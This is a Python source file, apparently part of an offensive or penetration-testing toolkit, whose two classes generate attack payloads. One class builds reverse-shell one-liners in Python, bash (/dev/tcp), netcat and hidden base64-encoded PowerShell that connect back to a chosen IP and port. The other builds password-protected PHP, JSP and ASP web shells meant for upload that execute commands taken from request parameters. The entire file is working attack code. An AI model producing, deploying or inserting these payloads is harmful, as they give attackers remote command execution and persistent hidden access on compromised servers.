import base64

class ShellGenerator:
    @staticmethod
    def generate_reverse_shell(ip, port, type="python"):
        """
        Generates a reverse shell one-liner.
        """
        payload = ""
        if type == "python":
            cmd = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
            # Base64 encode to avoid bad chars
            b64 = base64.b64encode(cmd.encode()).decode()
            payload = f"python -c \"exec(__import__('base64').b64decode('{b64}'))\""
            
        elif type == "bash":
            payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            
        elif type == "nc":
            payload = f"nc -e /bin/sh {ip} {port}"
            
        elif type == "powershell":
            # Simple TCP client
            ps_script = f"$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
            payload = f"powershell -nop -w hidden -e {b64}"
            
        return payload

class WebShellGenerator:
    @staticmethod
    def generate_webshell(ext="php", password="lockon"):
        """
        Generates a minimal web shell for upload.
        """
        if ext == "php":
            # One-liner with password protection
            return f"<?php if($_GET['p']=='{password}'){{system($_GET['c']);}} ?>"
            
        elif ext == "jsp":
             return f"<% if(request.getParameter(\"p\").equals(\"{password}\")){{ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"c\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){{ out.println(new String(b,0,a)); }} }} %>"
             
        elif ext == "asp":
             return f"<% If Request(\"p\")=\"{password}\" Then Execute(Request(\"c\")) End If %>"
             
        return "Unknown extension"
